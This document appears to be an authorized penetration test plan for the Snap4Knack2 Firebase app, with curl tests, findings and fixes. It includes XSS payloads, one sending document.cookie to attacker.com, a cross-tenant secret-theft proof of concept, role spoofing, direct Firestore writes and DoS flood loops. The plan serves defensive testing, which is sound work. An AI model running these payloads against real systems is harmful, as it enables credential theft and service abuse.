# Penetration Test Regiment — Snap4Knack2

**Date:** March 6, 2026  
**Scope:** Black-box and grey-box testing of all externally reachable surfaces  
**Prerequisites:** Written authorization from system owner, staging environment, test Knack account  
**Methodology:** OWASP Web Security Testing Guide (WSTG) v4.2 + Firebase-specific attack patterns  
**Tools:** Burp Suite Pro, OWASP ZAP, curl, jwt_tool, gcloud CLI, Firebase REST API, custom scripts

> ⚠️ **All tests must be performed against the designated staging environment (`snap4knack2-staging`). Running any destructive test against production without explicit written authorization is illegal under the CFAA and analogous statutes.**

---

## 1. Attack Surface Inventory

| Surface | Protocol | Auth required | Notes |
|---------|----------|---------------|-------|
| `https://snap4knack2.web.app` | HTTPS | No (public SPA) | React SPA, served from Firebase Hosting CDN |
| `POST /issueWidgetToken` | HTTPS | None (unauthenticated) | Issues Firebase custom token |
| `POST /submitSnap` | HTTPS | Bearer token (Firebase ID token) | Writes to Firestore |
| `POST /contactForm` | HTTPS | None (unauthenticated) | Sends email |
| Firebase Storage REST API | HTTPS | Bearer token | PNG / WebM upload |
| Firestore REST API | HTTPS | Bearer token | Read/Write docs |
| Identity Toolkit REST API | HTTPS | API key | `signInWithCustomToken` |
| Firebase `onCall` functions | HTTPS | Firebase ID token | `storeKnackApiKey`, `inviteClient`, etc. |

---

## 2. Recon Phase

### 2.1 — Enumerate exposed endpoints from widget source

The widget file at `https://snap4knack2.web.app/widget/snap4knack.js` is publicly accessible with `Access-Control-Allow-Origin: *` and contains:

| Finding | Value |
|---------|-------|
| Firebase project ID | `snap4knack2` |
| Firebase Storage bucket | `snap4knack2.firebasestorage.app` |
| Functions base URL | `https://us-central1-snap4knack2.cloudfunctions.net` |
| Firebase API key | `AIzaSyC6J5VNpybrQUnD-pbnaQkXjcAeVAUZZKo` |
| All three function names | `issueWidgetToken`, `submitSnap` (and `contactForm` via Home page source) |

**Test:** Confirm all functions respond, enumerate HTTP methods:

```bash
for fn in issueWidgetToken submitSnap contactForm; do
  echo "=== $fn ==="
  for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X $method "https://us-central1-snap4knack2.cloudfunctions.net/$fn")
    echo "$method → $code"
  done
done
```

**Expected:** GET/PUT/DELETE/PATCH return 405. POST returns 200 or 4xx. OPTIONS returns 204.

---

### 2.2 — Enumerate `onCall` function names

Firebase `onCall` functions are accessible at:
`POST https://us-central1-snap4knack2.cloudfunctions.net/<functionName>`

with the standard `{ data: {} }` onCall envelope. Enumerate known names from the widget source and Git history:

```bash
for fn in storeKnackApiKey fetchKnackRoles inviteClient acceptInvitation revokeClientAccess; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://us-central1-snap4knack2.cloudfunctions.net/$fn" \
    -H "Content-Type: application/json" \
    -d '{"data":{}}')
  echo "$fn → $code"
done
```

**Expected:** All return 401 UNAUTHENTICATED (no auth token provided). Any 500 leaking stack traces should be flagged.

---

## 3. Authentication & Authorization Tests

### 3.1 — `issueWidgetToken` — tenant/plugin enumeration

**Objective:** Determine whether valid `tenantId`/`pluginId` pairs can be brute-forced.

**Test:**
```bash
# Known-good combo from test env
curl -s -X POST .../issueWidgetToken \
  -H "Content-Type: application/json" \
  -d '{"pluginId":"INVALID_PLUGIN","tenantId":"VALID_TENANT","knackUserId":"u1","knackUserRole":"r1"}'
```

**Expected:** `404 Plugin not found or inactive.` — does not reveal whether the tenantId is valid.

**Attack:** Vary only `tenantId` with a wordlist. Any response difference (timing, error wording) leaks valid tenant IDs.

**Pass criteria:** Identical response body and within 10% timing variance for all non-existent combos.

---

### 3.2 — `issueWidgetToken` — role spoofing

**Objective:** Obtain a token claiming a higher-privilege role than the Knack user actually has.

**Scenario:** Plugin is configured with `selectedRoles: ["profile_19"]`. Test whether sending `knackUserRole: "profile_19"` without being authenticated as that role succeeds.

```bash
# Attacker has a Knack session as profile_1 (low privilege)
# Sends role claim of profile_19 (high privilege required by plugin)
curl -X POST .../issueWidgetToken \
  -d '{"pluginId":"PLUG","tenantId":"TEN","knackUserId":"attacker_id","knackUserRole":"profile_19"}'
```

**Expected:** Token issued (the function cannot verify the real role — this is a known gap per Security Audit H-04). The test **should fail** (token should be denied), but currently **will pass** — demonstrating the vulnerability.

**Remediation:** Verify role server-side via Knack REST API before issuing the token.

---

### 3.3 — Token reuse across tenants

**Objective:** Use a widget token issued for tenant A to submit a snap attributed to tenant B.

**Steps:**
1. Obtain a valid ID token via `issueWidgetToken` for `tenantId: "tenant-A"`.
2. POST to `submitSnap` with `tenantId` field in body set to `"tenant-B"`.

```bash
curl -X POST .../submitSnap \
  -H "Authorization: Bearer $TOKEN_TENANT_A" \
  -H "Content-Type: application/json" \
  -d '{
    "type":"full_viewport",
    "formData":{"category":"Bug","description":"cross-tenant test"},
    "context":{"pageUrl":"https://example.com"},
    "consoleErrors":[],
    "priority":"low"
  }'
```

**Expected:** Snap is stored under `tenantId: "tenant-A"` (from the verified token claim), not the body-supplied value. The function correctly sources `tenantId` from `decoded.snap_tenantId` — **should pass.**

**Confirm:** Query Firestore to verify the resulting document has `tenantId == "tenant-A"`.

---

### 3.4 — Firestore direct write — bypass `submitSnap`

**Objective:** Write a `snap_submissions` document directly via the Firestore REST API using a widget ID token from tenant A.

```bash
curl -X POST \
  "https://firestore.googleapis.com/v1/projects/snap4knack2/databases/(default)/documents/snap_submissions" \
  -H "Authorization: Bearer $WIDGET_ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "fields": {
      "tenantId": {"stringValue": "tenant-B"},
      "pluginId":  {"stringValue": "any-plugin"},
      "status":    {"stringValue": "new"},
      "priority":  {"stringValue": "high"}
    }
  }'
```

**Expected (current rules):** `200 OK` — the Firestore rule `allow create: if isAuthenticated()` permits this. **This is the H-03 vulnerability.** A successful write here is a **FAIL**.

**Expected (after fix):** `403 PERMISSION_DENIED`.

---

### 3.5 — Invitation token brute-force

The invitation token is generated as:
```typescript
Array.from(crypto.getRandomValues(new Uint8Array(16)))
  .map(b => b.toString(16).padStart(2, '0')).join('')
```
This is a 128-bit random hex string. With $2^{128}$ possible values, brute-force is computationally infeasible. However:

**Test:** Confirm `acceptInvitation` does not leak the document ID via error message timing or IDOR on the `invitationId` parameter.

```bash
# Use a valid invitationId but wrong token
curl -X POST .../acceptInvitation \
  -H "Authorization: Bearer $USER_ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"data":{"token":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","invitationId":"VALID_DOC_ID"}}'
```

**Expected:** `invalid-argument: Invalid token`. Response time should be constant (no short-circuit that reveals the token length or prefix correctness).

---

### 3.6 — `revokeClientAccess` — IDOR (Insecure Direct Object Reference)

**Objective:** Tenant B revokes an invitation belonging to tenant A.

```bash
# Authenticated as tenant-B
curl -X POST .../revokeClientAccess \
  -H "Authorization: Bearer $TENANT_B_ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"data":{"invitationId":"TENANT_A_INVITE_DOC_ID"}}'
```

**Expected:** `permission-denied: Not authorized` — the function checks `inv.tenantId !== request.auth.uid`. **Should pass.**

---

## 4. Input Validation Tests

### 4.1 — HTML/Script injection via `contactForm`

**Objective:** Verify whether the contact form endpoint sanitizes HTML before embedding in email.

**Test payloads:**

```bash
# XSS payload in name field
curl -X POST .../contactForm \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<script>alert(document.cookie)</script>",
    "email": "attacker@evil.com",
    "message": "Test message"
  }'

# href injection in email field
curl -X POST .../contactForm \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Attacker",
    "email": "x@y.com\" onmouseover=\"fetch(atob(\"...\"))",
    "message": "Test"
  }'

# HTML table escape in message
curl -X POST .../contactForm \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Normal",
    "email": "test@test.com",
    "message": "</td></tr></table><img src=x onerror=fetch(\"https://attacker.com/?\"+document.cookie)>"
  }'
```

**Expected (current code):** All three payloads are delivered verbatim into the email HTML. **FAIL** — this is the C-01 critical finding.

**Expected (after fix):** All special chars are HTML-encoded; the script tags and event handlers are inert in the rendered email.

---

### 4.2 — Oversized payload flood to `submitSnap`

```bash
# Generate a 10,000-entry consoleErrors array
python3 -c "
import json, sys
payload = {
  'type': 'full_viewport',
  'consoleErrors': [{'level':'error','message':'A'*500,'timestamp':1} for _ in range(10000)],
  'formData': {},
  'context': {},
  'priority': 'low'
}
print(json.dumps(payload))
" > big_payload.json

curl -X POST .../submitSnap \
  -H "Authorization: Bearer $VALID_TOKEN" \
  -H "Content-Type: application/json" \
  -d @big_payload.json
```

**Expected (current):** Firestore write succeeds with a document exceeding 1 MB → **Firestore will reject with a "Document too large" error (400)**. The function unhandled exception returns 500. **Partial fail** — the function should validate and truncate before attempting the write.

**Expected (after fix):** The function truncates `consoleErrors` to 100 and `annotationData` to a reasonable size, returning 200 with a validly stored document.

---

### 4.3 — SQL/NoSQL injection attempts

Firestore uses structured field-path queries, not SQL. Direct injection into collection/document path components is the relevant attack:

```bash
# Attempt path traversal in tenantId claim (via token)
# Would require forging a custom token — not directly feasible without admin SDK access
# Test: does the function accept tenantId values with special chars in Firestore paths?

# Craft a submission with a tenantId that contains path separators
# (only possible if custom token minting is compromised)
curl -X POST .../submitSnap \
  -H "Authorization: Bearer $TOKEN_WITH_TRAVERSAL_TENANTID" \
  -d '{"type":"full_viewport","formData":{},"context":{},"consoleErrors":[]}'
```

**Expected:** Firestore doc path `snap_counters/tenant-A/path/traversal` is invalid; Firestore rejects with a path error. Firebase Admin SDK normalizes document IDs.

---

### 4.4 — SSRF via `fetchKnackRoles`

**Objective:** The `fetchKnackRoles` function calls `axios.get("https://api.knack.com/v1/objects", ...)` where the `appId` comes from the caller. Can an authenticated tenant direct the function to make requests against internal Google Cloud metadata endpoints?

```bash
# Authenticated as a valid tenant
curl -X POST .../fetchKnackRoles \
  -H "Authorization: Bearer $TENANT_ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "data": {
      "appId": "REAL_APP_ID",
      "secretName": "projects/snap4knack2/secrets/knack-TENANTID-CONNID/versions/latest"
    }
  }'
```

**SSRF variant — attempt to override the base URL via `appId`:**
The `appId` is only used as a header value (`X-Knack-Application-Id`: appId), not in URL construction. The URL is always `https://api.knack.com/...` — hardcoded. **No SSRF surface here.**

However, `secretName` is passed directly to `secretClient.accessSecretVersion({ name: secretName })`. A tenant could pass a secretName pointing to **another tenant's secret**:

```bash
# Tenant A attempts to read Tenant B's Knack API key
curl -X POST .../fetchKnackRoles \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -d '{"data":{"appId":"any","secretName":"projects/snap4knack2/secrets/knack-TENANTB-CONN/versions/latest"}}'
```

**Expected (current):** The Secret Manager call will succeed if the Cloud Function's service account has `secretmanager.secretAccessor` on all secrets. The function does **not** validate that `secretName` belongs to `request.auth.uid`.  **FAIL — privilege escalation between tenants.**

**Fix:** Validate that `secretName` starts with `projects/snap4knack2/secrets/knack-${request.auth.uid}-`:
```typescript
const expectedPrefix = `projects/${PROJECT_ID}/secrets/knack-${request.auth.uid}-`;
if (!secretName.startsWith(expectedPrefix)) {
  throw new functions.https.HttpsError('permission-denied', 'Secret not owned by caller.');
}
```

---

### 4.5 — `storeKnackApiKey` — Secret Manager secret injection

**Objective:** An authenticated tenant can store an API key under any `secretId` they control. Test whether the `secretId` construction prevents a tenant from overwriting another tenant's secret.

```typescript
const secretId = `knack-${tenantId}-${connectionId}`;
```

`tenantId` comes from `request.auth.uid` — verified. `connectionId` comes from `request.data` — caller-controlled. A malicious caller with a deliberate `connectionId` containing path-like characters could attempt:

```bash
curl -X POST .../storeKnackApiKey \
  -H "Authorization: Bearer $VALID_TENANT_TOKEN" \
  -d '{
    "data": {
      "connectionId": "X/secrets/knack-OTHER-TENANT-conn",
      "tenantId": "MY_UID",
      "apiKey": "malicious_key",
      "appId": "app1"
    }
  }'
```

**Expected:** Secret Manager secret IDs cannot contain `/` — the `createSecret` call will fail with `INVALID_ARGUMENT`. **Pass**, but should be explicitly validated with an alphanumeric allowlist:
```typescript
if (!/^[a-zA-Z0-9_-]+$/.test(connectionId)) {
  throw new HttpsError('invalid-argument', 'Invalid connectionId format.');
}
```

---

## 5. Session Management Tests

### 5.1 — Firebase ID token replay after revocation

**Objective:** After `revokeClientAccess` invalidates a client's access, can they still use an existing ID token?

**Steps:**
1. Client accepts an invitation, obtains an ID token.
2. Tenant calls `revokeClientAccess`.
3. Client immediately uses the **existing** ID token to call `submitSnap` or read a submission.

**Expected:** Firebase ID tokens are valid for up to 1 hour after issuance. `revokeClientAccess` removes `clientAccess` from the user's Firestore document and calls no Firebase Auth token revocation. The token remains valid for its remaining lifetime.

**Result:** **Partial fail** — up to 59 minutes of residual access after revocation.

**Fix:** Call `auth.revokeRefreshTokens(uid)` in `revokeClientAccess`, then update Firestore rules to include `request.auth.token.auth_time` check:
```js
function isRecentToken() {
  return request.auth.token.auth_time > (request.time.toMillis() / 1000 - 3600);
}
```

---

### 5.2 — Widget ID token lifetime test

**Objective:** Confirm the 50-minute token refresh logic (`ensureFreshToken`) in the widget works correctly.

**Manual test:**
1. Open the widget in a Knack app.
2. Intercept the `issueWidgetToken` response with Burp Suite to capture the custom token.
3. Let 51 minutes elapse.
4. Click "Send Feedback" → submit a snap.
5. Observe whether a new call to `issueWidgetToken` is made before the storage upload.

**Expected:** A second call to `issueWidgetToken` is visible in the network inspector before the storage upload. The submit succeeds. **Should pass** (token refresh implemented in commit `85ead3e`).

---

## 6. Information Disclosure Tests

### 6.1 — Error message enumeration via HTTP status codes

**Test all publicly accessible endpoints with missing/malformed bodies:**

```bash
# submitSnap with no body
curl -s -X POST .../submitSnap -H "Content-Type: application/json" -d '{}'

# Expected: 401 {"error":"Missing auth token"}
# NOT: stack trace or function filename

# issueWidgetToken with partial body
curl -s -X POST .../issueWidgetToken -H "Content-Type: application/json" \
  -d '{"pluginId":"x"}'

# Expected: 400 {"error":"Missing required widget params."}
# NOT: Firestore error details, project IDs, or internal paths
```

**Pass criteria:** No stack traces, no Firebase internal error codes, no Cloud Function source paths in error responses.

---

### 6.2 — Firestore document IDOR — read other tenants' submissions

**Objective:** Authenticated as tenant A, attempt to read a submission belonging to tenant B via Firestore REST.

```bash
curl "https://firestore.googleapis.com/v1/projects/snap4knack2/databases/(default)/documents/snap_submissions/TENANT_B_DOC_ID" \
  -H "Authorization: Bearer $TENANT_A_ID_TOKEN"
```

**Expected:** `403 PERMISSION_DENIED` — the Firestore read rule:
```js
allow read: if isAuthenticated() && (
  isAdmin() ||
  resource.data.tenantId == request.auth.uid ||
  clientHasPluginAccess(resource.data.pluginId) || ...
)
```
should block this. **Should pass.**

---

### 6.3 — Security header presence check

```bash
curl -sI "https://snap4knack2.web.app" | grep -iE \
  "content-security-policy|x-frame-options|x-content-type-options|strict-transport|referrer-policy|permissions-policy"
```

**Expected:** All six headers present. **Currently fails** (see Security Audit M-01) — no security headers are set on the SPA route.

---

### 6.4 — Widget serves with wildcard CORS — cross-origin data exfiltration risk

```bash
curl -sI "https://snap4knack2.web.app/widget/snap4knack.js" | grep "Access-Control"
# Access-Control-Allow-Origin: *
```

The widget JS file is intentionally wildcard-CORS (it must be embeddable in Knack). However, the same origin pattern applies to all `/widget/**` files. Verify that no authentication cookies or tokens are served on this path — they would be exfiltrable by any origin.

**Expected:** No `Set-Cookie` headers on widget responses. **Should pass.**

---

## 7. Business Logic Tests

### 7.1 — Submit snap without capture (no screenshot URL)

```bash
curl -X POST .../submitSnap \
  -H "Authorization: Bearer $VALID_TOKEN" \
  -d '{"type":"full_viewport","screenshotUrl":null,"formData":{},"context":{},"consoleErrors":[],"priority":"low"}'
```

**Expected:** 200 OK — the function permits null `screenshotUrl`. This is intentional (console-only snaps). Confirm the document is stored with `screenshotUrl: null`.

---

### 7.2 — `snapNumber` counter cannot be manipulated

**Objective:** The `snap_counters/{tenantId}` Firestore document is write-accessible according to current rules. Can an authenticated tenant write to it to reset or skip snap numbers?

```bash
curl -X PATCH \
  "https://firestore.googleapis.com/v1/projects/snap4knack2/databases/(default)/documents/snap_counters/TENANT_ID" \
  -H "Authorization: Bearer $TENANT_ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"fields":{"count":{"integerValue":"0"}}}'
```

**Expected (current rules):** The `snap_counters` collection has **no explicit Firestore rule** — it falls through to the default deny. **Should return 403.** Verify this.

**If it returns 200:** Add an explicit rule:
```js
match /snap_counters/{tenantId} {
  allow read, write: if false;  // server-side only, written by Cloud Function
}
```

---

### 7.3 — Concurrent snap submission race condition

**Objective:** Verify the Firestore transaction in `submitSnap` prevents duplicate snap numbers under concurrent load.

```bash
# Fire 20 concurrent requests
for i in $(seq 1 20); do
  curl -s -X POST .../submitSnap \
    -H "Authorization: Bearer $VALID_TOKEN" \
    -d '{"type":"full_viewport","formData":{},"context":{},"consoleErrors":[],"priority":"low"}' &
done
wait

# Then query Firestore for all snapNumbers created — look for duplicates
```

**Expected:** All 20 documents have unique `snapNumber` values. The Firestore transaction ensures atomicity. **Should pass**, though at 20 concurrent writes against a single counter document, latency may spike significantly.

---

## 8. Denial of Service Tests

### 8.1 — `contactForm` email exhaustion

```bash
# 100 rapid-fire contact form submissions
for i in $(seq 1 100); do
  curl -s -X POST .../contactForm \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"Test $i\",\"email\":\"test@test.com\",\"message\":\"Flood test\"}" &
done
wait
```

**Expected (current):** All 100 emails are sent (or attempted) — SendGrid's per-second limit may throttle some. **Result: 100 emails delivered to `info@` and `rich@` — effective spam DoS.** The absence of rate limiting is the H-01 finding.

---

### 8.2 — `issueWidgetToken` with invalid plugin ID — Firestore read amplification

```bash
# 1000 requests with random pluginIds — each triggers a Firestore read
for i in $(seq 1 1000); do
  curl -s -X POST .../issueWidgetToken \
    -d "{\"pluginId\":\"fake_$(shuf -i 1000-9999 -n 1)\",\"tenantId\":\"VALID_TENANT\",\"knackUserId\":\"u1\",\"knackUserRole\":\"r1\"}" \
    -H "Content-Type: application/json" &
done
wait
```

**Expected:** 1000 Firestore reads billed to the project at no cost to the attacker. This is a low-cost billing amplification DoS. Mitigated by App Check (H-02) or rate limiting (H-01).

---

## 9. Test Execution Matrix

| Test ID | Category | Tool | Env | Expected Result | Status |
|---------|----------|------|-----|-----------------|--------|
| 2.1 | Recon | curl | Staging | 405 on non-POST | To run |
| 3.1 | AuthN | curl | Staging | No timing oracle | To run |
| 3.2 | AuthZ | curl | Staging | **FAIL** (role spoofing works) | Known vuln H-04 |
| 3.3 | AuthZ | curl | Staging | PASS (token claims used) | To verify |
| 3.4 | AuthZ | curl | Staging | **FAIL** (free Firestore write) | Known vuln H-03 |
| 3.5 | AuthN | curl | Staging | PASS (128-bit token) | To verify |
| 3.6 | AuthZ | curl | Staging | PASS (tenantId check) | To verify |
| 4.1 | Injection | curl | Staging | **FAIL** (HTML injection) | Known vuln C-01 |
| 4.2 | Validation | curl | Staging | FAIL (no size check) | Known vuln M-03 |
| 4.4 | SSRF | curl | Staging | **FAIL** (secretName IDOR) | New finding |
| 4.5 | Injection | curl | Staging | PASS (SM rejects /) | To verify |
| 5.1 | Session | Manual | Staging | FAIL (token survives revoke) | Known gap |
| 5.2 | Session | Burp / browser | Staging | PASS (refresh implemented) | To verify |
| 6.1 | Disclosure | curl | Staging | PASS (no stack traces) | To verify |
| 6.2 | AuthZ | curl | Staging | PASS (Firestore rule) | To verify |
| 6.3 | Headers | curl | Production | **FAIL** (no security headers) | Known vuln M-01 |
| 7.2 | Logic | curl | Staging | PASS (default deny) | To verify |
| 7.3 | Race | bash parallel | Staging | PASS (transaction) | To verify |
| 8.1 | DoS | bash | Staging | **FAIL** (no rate limit) | Known vuln H-01 |
| 8.2 | DoS | bash | Staging | **FAIL** (Firestore amplification) | Known vuln H-01/H-02 |

---

## 10. New Finding — `fetchKnackRoles` Secret Name IDOR (High)

> This finding was discovered during pen test preparation and is **not** listed in the Security Audit. It should be treated as High severity.

**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Description:** The `fetchKnackRoles` Cloud Function accepts a `secretName` string from the authenticated caller and passes it directly to `secretClient.accessSecretVersion()`. There is no validation that `secretName` is owned by the calling tenant.

**Proof of concept:**
```bash
# Tenant A reads Tenant B's Knack API key
curl -X POST .../fetchKnackRoles \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -d '{"data":{"appId":"any","secretName":"projects/snap4knack2/secrets/knack-TENANTB-CONNID/versions/latest"}}'
```

**Impact:** Any tenant can exfiltrate any other tenant's stored Knack REST API key.

**Fix:**
```typescript
const uid = request.auth.uid;
const expectedPrefix = `projects/${PROJECT_ID}/secrets/knack-${uid}-`;
if (!secretName.startsWith(expectedPrefix)) {
  throw new functions.https.HttpsError('permission-denied', 'Secret not authorized.');
}
```

---

## 11. Remediation Tracking

| Finding | Source | Severity | Owner | Target |
|---------|--------|----------|-------|--------|
| C-01 HTML injection in email | Security Audit | Critical | Backend | Sprint 1 |
| H-03 Firestore create rule | Security Audit | High | Backend | Sprint 1 |
| New: `fetchKnackRoles` secret IDOR | Pen Test | High | Backend | Sprint 1 |
| M-01 Missing HTTP headers | Security Audit | Medium | DevOps | Sprint 2 |
| H-01 Rate limiting | Security Audit | High | Backend | Sprint 2 |
| H-02 App Check | Security Audit | High | Backend | Sprint 3 |
| H-04 Role verification | Security Audit | High | Backend | Sprint 3 |
| 5.1 Token revocation gap | Pen Test | Medium | Backend | Sprint 3 |
| 7.2 `snap_counters` rule | Pen Test | Medium | Backend | Sprint 1 |
